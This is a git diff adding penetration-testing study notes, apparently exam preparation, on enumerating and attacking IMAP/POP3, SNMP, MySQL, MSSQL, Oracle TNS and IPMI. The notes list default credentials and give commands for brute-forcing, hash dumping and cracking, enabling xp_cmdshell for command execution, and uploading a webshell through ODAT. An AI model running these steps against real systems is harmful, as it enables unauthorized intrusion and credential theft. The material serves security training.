@@ -792,3 +792,641 @@ sudo nmap -p25 --script smtp-open-relay <IP>
 :::
 
 ---
+
+### IMAP / POP3 (Ports 143, 993 / 110, 995)
+
+IMAP and POP3 are the **receiving** side of email. SMTP sends — these two fetch.
+
+| | IMAP | POP3 |
+|---|------|------|
+| **Port (plain)** | 143 | 110 |
+| **Port (SSL)** | 993 | 995 |
+| **Emails stored** | On server | Downloaded to client |
+| **Folder support** | Yes | No |
+| **Multi-client sync** | Yes | No |
+| **Use case** | Full mailbox management | Simple download + delete |
+
+Both are **unencrypted by default**. SSL versions run on 993/995.
+
+#### IMAP Commands
+
+```
+1 LOGIN username password       # authenticate
+1 LIST "" *                     # list all folders
+1 SELECT INBOX                  # open a mailbox
+1 FETCH <ID> all                # retrieve a message
+1 LSUB "" *                     # list subscribed folders
+1 CLOSE                         # expunge deleted messages
+1 LOGOUT                        # end session
+```
+
+#### POP3 Commands
+
+```
+USER username    # identify user
+PASS password    # authenticate
+STAT             # number of emails on server
+LIST             # list all emails with sizes
+RETR <id>        # download email by ID
+DELE <id>        # delete email by ID
+CAPA             # show server capabilities
+QUIT             # end session
+```
+
+#### Dangerous Settings (Dovecot)
+
+| Setting | Risk |
+|---------|------|
+| `auth_debug=yes` | Logs all auth attempts in detail |
+| `auth_debug_passwords=yes` | Logs submitted passwords in plaintext |
+| `auth_verbose=yes` | Logs failed auth attempts and reasons |
+| `auth_verbose_passwords=yes` | Logs truncated passwords |
+| `auth_anonymous_username` | Enables anonymous login via SASL ANONYMOUS |
+
+#### Enumeration
+
+**Nmap:**
+```bash
+sudo nmap -sV -sC -p110,143,993,995 <IP>
+```
+
+SSL certificate in the output reveals: hostname, org, location, admin email address.
+
+**cURL — list IMAP folders with credentials:**
+```bash
+curl -k 'imaps://<IP>' --user username:password
+```
+
+**cURL verbose — see TLS version, cert details, full IMAP handshake:**
+```bash
+curl -k 'imaps://<IP>' --user username:password -v
+```
+
+**OpenSSL — interactive session over SSL:**
+```bash
+# POP3S
+openssl s_client -connect <IP>:995
+
+# IMAPS
+openssl s_client -connect <IP>:993
+```
+
+After connecting with openssl, type IMAP or POP3 commands directly. The SSL cert will show hostname and email — useful for recon even before authenticating.
+
+**If you have credentials — read emails via IMAP:**
+```bash
+openssl s_client -connect <IP>:993
+# then:
+1 LOGIN username password
+1 LIST "" *
+1 SELECT INBOX
+1 FETCH 1 all
+```
+
+:::info CJCA Exam — IMAP/POP3 Must-Know
+**Ports:** IMAP 143 (plain) / 993 (SSL) — POP3 110 (plain) / 995 (SSL)
+
+**Key difference:** IMAP keeps mail on server + folder sync. POP3 just downloads.
+
+**Nmap scan:**
+```bash
+sudo nmap -sV -sC -p110,143,993,995 <IP>
+```
+
+**List folders with creds:**
+```bash
+curl -k 'imaps://<IP>' --user user:pass
+```
+
+**Interactive session:**
+```bash
+openssl s_client -connect <IP>:993   # IMAP
+openssl s_client -connect <IP>:995   # POP3
+```
+
+**Read inbox once logged in:**
+```
+1 LOGIN user pass → 1 LIST "" * → 1 SELECT INBOX → 1 FETCH 1 all
+```
+
+**SSL cert leaks:** hostname, org, admin email — check it even before auth.
+
+**Dangerous config:** `auth_debug_passwords=yes` logs plaintext passwords.
+:::
+
+---
+
+### SNMP (UDP 161 / 162)
+
+**Not to be confused with SMTP.** SMTP = email sending. SNMP = network device monitoring and management.
+
+SNMP (Simple Network Management Protocol) monitors and controls routers, switches, servers, printers, IoT devices — anything network-attached. It can read device state AND push config changes remotely.
+
+**Ports:**
+- **UDP 161** — queries and commands (client → device)
+- **UDP 162** — traps (device → client, unsolicited alerts on events)
+
+#### SNMP Versions
+
+| Version | Security |
+|---------|----------|
+| **v1** | No authentication, no encryption — everything in plaintext |
+| **v2c** | Same security as v1, community strings still plaintext |
+| **v3** | Username + password auth, pre-shared key encryption — secure but complex |
+
+Most networks still run v2c because migrating to v3 is painful. This means community strings travel in plaintext on the wire.
+
+#### Community Strings
+
+Community strings are effectively plaintext passwords for v1/v2c access:
+- **`public`** — read-only (default, almost never changed)
+- **`private`** — read-write (default write community)
+
+If `public` works → you can read the entire MIB tree of the device.
+If `private` works → you can also write config changes.
+
+#### MIB and OID
+
+- **MIB** (Management Information Base) — a text file describing all queryable objects on a device. Tells you what OIDs exist, what type they are, what they mean.
+- **OID** (Object Identifier) — a numeric dotted path to a specific data point (e.g. `.1.3.6.1.2.1.1.5.0` = hostname). The longer the chain, the more specific the value.
+
+You don't need to memorize OIDs — `snmpwalk` resolves them to human-readable strings automatically.
+
+#### Dangerous Settings
+
+| Setting | Risk |
+|---------|------|
+| `rwuser noauth` | Full OID tree write access with no authentication |
+| `rwcommunity <string> <IP>` | Read-write access from any IP using that community string |
+| `rwcommunity6 <string> <IPv6>` | Same over IPv6 |
+
+#### Enumeration
+
+**snmpwalk — dump all OIDs using a community string:**
+```bash
+snmpwalk -v2c -c public <IP>
+```
+
+Returns: OS version, hostname, uptime, contact email, location, running processes, installed packages, network interfaces — massive intel dump from a single command.
+
+**onesixtyone — brute-force community strings:**
+```bash
+onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <IP>
+```
+
+Tries a wordlist of community strings. Returns the valid ones with the device banner.
+
+**braa — fast OID brute-force once you have a community string:**
+```bash
+braa <community string>@<IP>:.1.3.6.*
+# example:
+braa public@<IP>:.1.3.6.*
+```
+
+Walks the entire OID subtree rapidly. Useful for large-scale enumeration.
+
+:::info CJCA Exam — SNMP Must-Know
+**Ports:** UDP 161 (queries) / UDP 162 (traps)
+
+**Not SMTP** — SNMP monitors network devices, has nothing to do with email.
+
+**Default community strings to always try:** `public` (read), `private` (write)
+
+**Full device dump:**
+```bash
+snmpwalk -v2c -c public <IP>
+```
+Returns OS, hostname, uptime, contact, installed packages, processes — everything.
+
+**Brute-force community string:**
+```bash
+onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <IP>
+```
+
+**Dangerous config:** `rwcommunity public 0.0.0.0` — write access to any IP with default string.
+
+**v1/v2c weakness:** community strings travel in plaintext — sniffable on the wire.
+:::
+
+---
+
+### MySQL (Port 3306)
+
+MySQL is an open-source relational database management system — data stored in tables, queried with SQL. It's the backbone of nearly every web application (WordPress, Joomla, custom apps). **MariaDB** is a direct fork and is often used interchangeably. Common stack: **LAMP** (Linux + Apache + MySQL + PHP) or **LEMP** (with Nginx).
+
+**Port:** 3306/tcp
+
+Web apps store everything here: usernames, password hashes, emails, session tokens, content, permissions. If you can reach this port and authenticate, you have everything the app has.
+
+#### Config File
+
+```bash
+cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
+```
+
+**Dangerous settings:**
+
+| Setting | Risk |
+|---------|------|
+| `user` / `password` in config | Credentials stored in plaintext in the config file |
+| `admin_address` | If set to `0.0.0.0`, admin interface exposed externally |
+| `debug` / `sql_warnings` | Verbose error output — leaks schema info to users, enables SQL injection intel-gathering |
+| `secure_file_priv = ""` | No restriction on file import/export — enables `LOAD DATA` / `INTO OUTFILE` attacks |
+
+#### Nmap Enumeration
+
+```bash
+sudo nmap -sV -sC -p3306 --script mysql* <IP>
+```
+
+Key scripts in the `mysql*` family:
+- `mysql-empty-password` — checks if root has no password
+- `mysql-enum` — enumerates valid usernames
+- `mysql-info` — version, capabilities, auth plugin
+- `mysql-brute` — brute-force credentials
+
+Always verify nmap results manually — false positives are common with these scripts.
+
+#### Connect and Interact
+
+```bash
+# No password
+mysql -u root -h <IP>
+
+# With password (no space between -p and the password)
+mysql -u root -pP4SSw0rd -h <IP>
+```
+
+#### Key SQL Commands
+
+| Command | What it does |
+|---------|-------------|
+| `show databases;` | List all databases |
+| `use <database>;` | Switch to a database |
+| `show tables;` | List all tables in current database |
+| `show columns from <table>;` | Show table structure |
+| `select * from <table>;` | Dump entire table |
+| `select * from <table> where <col> = "<val>";` | Filtered query |
+| `select version();` | Show MySQL version |
+
+#### Important System Databases
+
+| Database | What it contains |
+|----------|-----------------|
+| `information_schema` | Metadata about all databases, tables, columns — ANSI standard |
+| `sys` | Performance and usage stats, connected hosts, active queries |
+| `mysql` | User accounts, privileges, authentication data |
+
+When you land in a MySQL shell, start with `show databases;` — the most interesting one is usually named after the application (e.g. `wordpress`, `joomla`, `app`).
+
+:::info CJCA Exam — MySQL Must-Know
+**Port:** 3306/tcp
+
+**Connect:**
+```bash
+mysql -u root -p<password> -h <IP>
+# no space between -p and password
+```
+
+**Enumerate with nmap:**
+```bash
+sudo nmap -sV -sC -p3306 --script mysql* <IP>
+```
+Check for `mysql-empty-password` — root with no password is an instant win.
+
+**First commands once in:**
+```sql
+show databases;
+use <interesting_db>;
+show tables;
+select * from users;
+```
+
+**Dangerous config:** `secure_file_priv = ""` enables file read/write via SQL.
+
+**Attack path:** Port exposed → nmap scripts → empty/default password → connect → dump users table → crack hashes or reuse credentials.
+:::
+
+---
+
+### MSSQL (Port 1433)
+
+Microsoft SQL Server — Windows-native, closed source, tightly integrated with Active Directory. Contrast with MySQL: MSSQL uses Windows Authentication by default and runs as a domain-aware service account.
+
+**Port:** 1433/tcp
+
+#### Default System Databases
+
+| Database | Purpose |
+|----------|---------|
+| `master` | Tracks all system info for the SQL instance |
+| `model` | Template for every new database created |
+| `msdb` | SQL Server Agent — jobs, alerts, scheduling |
+| `tempdb` | Temporary objects, intermediate query results |
+| `resource` | Read-only, contains built-in system objects |
+
+#### Default Configuration
+
+- Runs as `NT SERVICE\MSSQLSERVER` by default
+- **Windows Authentication** — login uses local SAM or Active Directory, not a separate DB user list
+- Encryption **not enforced** by default on connections
+
+#### Dangerous Settings
+
+| Issue | Risk |
+|-------|------|
+| Unencrypted client connections | Credentials and data in plaintext on the wire |
+| Self-signed certificates | Can be spoofed — false sense of encryption security |
+| Named pipes enabled | Additional attack vector beyond TCP |
+| Weak / default `sa` credentials | `sa` = system administrator account — full DB access if compromised |
+| SSMS installed with saved credentials | Client-side app may store creds attackers can reuse |
+
+#### Nmap Enumeration
+
+```bash
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
+  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
+  -sV -p1433 <IP>
+```
+
+Returns: hostname, instance name, SQL Server version, named pipe path, DAC port.
+
+#### Metasploit — Quick Ping
+
+```bash
+use auxiliary/scanner/mssql/mssql_ping
+set rhosts <IP>
+run
+```
+
+Returns: server name, instance name, version, TCP port, named pipe.
+
+#### Connect with Impacket
+
+```bash
+python3 mssqlclient.py Administrator@<IP> -windows-auth
+# or via impacket wrapper:
+impacket-mssqlclient Administrator@<IP> -windows-auth
+```
+
+`-windows-auth` tells it to use Windows/AD credentials instead of SQL auth.
+
+#### Key SQL Commands (T-SQL)
+
+| Command | What it does |
+|---------|-------------|
+| `select name from sys.databases` | List all databases |
+| `use <database>` | Switch to a database |
+| `select * from information_schema.tables` | List tables in current DB |
+| `select * from <table>` | Dump table |
+| `exec xp_cmdshell 'whoami'` | OS command execution (if enabled) |
+
+`xp_cmdshell` is disabled by default but can be re-enabled if you have `sa` or sysadmin rights — instant RCE.
+
+:::info CJCA Exam — MSSQL Must-Know
+**Port:** 1433/tcp — Windows environments
+
+**Nmap scan:**
+```bash
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info -sV -p1433 <IP>
+```
+
+**Connect (Impacket):**
+```bash
+impacket-mssqlclient Administrator@<IP> -windows-auth
+```
+
+**First command once in:**
+```sql
+select name from sys.databases
+```
+
+**Key difference from MySQL:** Windows Auth = AD credentials work. Check for `sa` account with empty/default password.
+
+**`xp_cmdshell`:** Disabled by default, but if you have sysadmin → enable it → OS command execution → RCE.
+
+**Attack path:** Port exposed → nmap scripts → try `sa` with empty password → connect → enumerate DBs → enable `xp_cmdshell` if sysadmin → RCE.
+:::
+
+---
+
+### Oracle TNS (Port 1521)
+
+Oracle's proprietary network protocol for communication between Oracle databases and clients. More complex to enumerate than MySQL/MSSQL — you need to know the correct **SID** before you can even connect.
+
+**Port:** 1521/tcp
+
+#### Key Concepts
+
+**SID (System Identifier)** — a unique name identifying a specific Oracle database instance. Multiple instances can run on one server, each with its own SID. The client must specify the correct SID in its connection string. It is not advertised — it must be guessed or brute-forced.
+
+**Config files** (located in `$ORACLE_HOME/network/admin/`):
+
+| File | Side | Purpose |
+|------|------|---------|
+| `tnsnames.ora` | Client | Maps service names to network addresses and SIDs |
+| `listener.ora` | Server | Defines listener properties — what ports, protocols, and instances it accepts |
+
+#### Default / Known Credentials
+
+| Account | Default password | Notes |
+|---------|-----------------|-------|
+| Oracle 9 install | `CHANGE_ON_INSTALL` | Often never changed |
+| `DBSNMP` service | `dbsnmp` | Monitoring service account |
+| `scott` | `tiger` | Classic test account — still found in production |
+
+#### Enumeration
+
+**Nmap — basic scan:**
+```bash
+sudo nmap -p1521 -sV <IP> --open
+```
+
+**Nmap — brute-force SID:**
+```bash
+sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
+```
+
+Returns the valid SID(s) — required before any further interaction.
+
+**ODAT — full enumeration (all modules):**
+```bash
+./odat.py all -s <IP>
+```
+
+ODAT tries all attack modules: SID guessing, credential brute-force, privilege checks, file upload, RCE attempts. Returns valid credentials if found (e.g. `scott/tiger`).
+
+#### Connect and Interact — sqlplus
+
+```bash
+# Standard login
+sqlplus scott/tiger@<IP>/XE
+
+# Login as sysdba (try even with low-priv account)
+sqlplus scott/tiger@<IP>/XE as sysdba
+```
+
+**Key SQL commands once in:**
+
+```sql
+select table_name from all_tables;          -- list all tables
+select * from user_role_privs;              -- check current user's roles
+select name, password from sys.user$;       -- extract password hashes (sysdba required)
+```
+
+#### Privilege Escalation — sysdba
+
+Even a standard user can attempt `as sysdba`. If the account has been granted that privilege (or the DB is misconfigured), you land as SYS with full admin rights. Always try it.
+
+#### File Upload → Webshell (ODAT utlfile)
+
+If the DB server also runs a web server, you can upload files directly via Oracle:
+
+```bash
+./odat.py utlfile -s <IP> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php
+```
+
+Verify upload:
+```bash
+curl -X GET http://<IP>/shell.php
+```
+
+Default web roots to try: `/var/www/html` (Linux), `C:\inetpub\wwwroot` (Windows).
+
+#### Extract Password Hashes
+
+```sql
+select name, password from sys.user$;
+```
+
+Returns hashed passwords for all DB accounts — crack offline with Hashcat.
+
+:::info CJCA Exam — Oracle TNS Must-Know
+**Port:** 1521/tcp
+
+**Two-step enumeration — SID first, then credentials:**
+```bash
+# Step 1: find the SID
+sudo nmap -p1521 --script oracle-sid-brute <IP>
+
+# Step 2: brute-force credentials
+./odat.py all -s <IP>
+```
+
+**Connect:**
+```bash
+sqlplus <user>/<pass>@<IP>/<SID>
+sqlplus <user>/<pass>@<IP>/<SID> as sysdba
+```
+
+**Default creds to always try:** `scott/tiger`, `dbsnmp/dbsnmp`, Oracle 9: `CHANGE_ON_INSTALL`
+
+**Once in as sysdba:**
+```sql
+select name, password from sys.user$;   -- dump hashes
+```
+
+**File upload to webroot:** `odat.py utlfile --putFile` → webshell if web server is co-located.
+
+**Attack path:** nmap SID brute → ODAT all → creds found → sqlplus → try sysdba → dump hashes or upload shell.
+:::
+
+---
+
+### IPMI (UDP 623)
+
+IPMI (Intelligent Platform Management Interface) is hardware-level remote management. It runs on a dedicated microcontroller called the **BMC (Baseboard Management Controller)**, completely independent of the host OS, BIOS, and CPU. Works even when the server is fully powered off or crashed.
+
+**Port:** 623/UDP
+
+
+Access to a BMC = near-physical access to the server. You can power on/off, reboot, reinstall the OS, read hardware event logs, monitor temperatures and voltages, and access serial console — all over the network.
+
+**Common BMC implementations:**
+- **HP iLO**
+- **Dell iDRAC** (formerly DRAC)
+- **Supermicro IPMI**
+
+All three typically expose a web management console + SSH/Telnet + UDP 623.
+
+#### Default Credentials
+
+| Product | Username | Password |
+|---------|----------|----------|
+| Dell iDRAC | `root` | `calvin` |
+| HP iLO | `Administrator` | Random 8-char (uppercase + digits) — but often set to something simple |
+| Supermicro IPMI | `ADMIN` | `ADMIN` |
+
+Always try defaults first — they are left unchanged far more often than they should be.
+
+#### Enumeration
+
+**Nmap:**
+```bash
+sudo nmap -sU --script ipmi-version -p 623 <IP>
+```
+
+**Metasploit — version scan:**
+```bash
+use auxiliary/scanner/ipmi/ipmi_version
+set rhosts <IP>
+run
+```
+
+Returns: IPMI version, supported auth methods, user auth details.
+
+#### RAKP Vulnerability — Hash Dumping (IPMI 2.0)
+
+A flaw in the IPMI 2.0 RAKP authentication protocol: the server sends the user's **salted password hash to the client before authentication completes**. This means you can request hashes for any valid username without knowing the password.
+
+**Metasploit — dump hashes:**
+```bash
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set rhosts <IP>
+run
+```
+
+Returns HMAC-SHA1 hashes for all valid users — save them for offline cracking.
+
+**Crack with Hashcat (mode 7300):**
+```bash
+hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
+```
+
+**HP iLO factory default — mask attack (8 chars, uppercase + digits):**
+```bash
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+```
+
+There is no fix for the RAKP flaw — it's baked into the IPMI 2.0 spec. Mitigations are long passwords and network segmentation only.
+
+#### Why IPMI Matters on Internal Assessments
+
+Cracked IPMI passwords are frequently **reused across other systems**. A single cracked BMC password has led to root SSH access across entire server fleets in real engagements. Always include IPMI in internal pentest scope.
+
+:::info CJCA Exam — IPMI Must-Know
+**Port:** 623/UDP
+
+**What it is:** Hardware remote management — independent of OS, works even when server is off. Access = physical access.
+
+**Enumerate:**
+```bash
+sudo nmap -sU --script ipmi-version -p 623 <IP>
+```
+
+**Default creds to try:** Dell `root/calvin` — Supermicro `ADMIN/ADMIN` — HP `Administrator/<try common>`
+
+**RAKP hash dump (no password needed):**
+```bash
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+```
+
+**Crack hashes:**
+```bash
+hashcat -m 7300 ipmi.txt <wordlist>
+```
+
+**Attack path:** nmap UDP 623 → try default creds → if no luck → dump RAKP hashes → crack offline → login to BMC web console or SSH → check password reuse on other systems.
+:::
+
+---
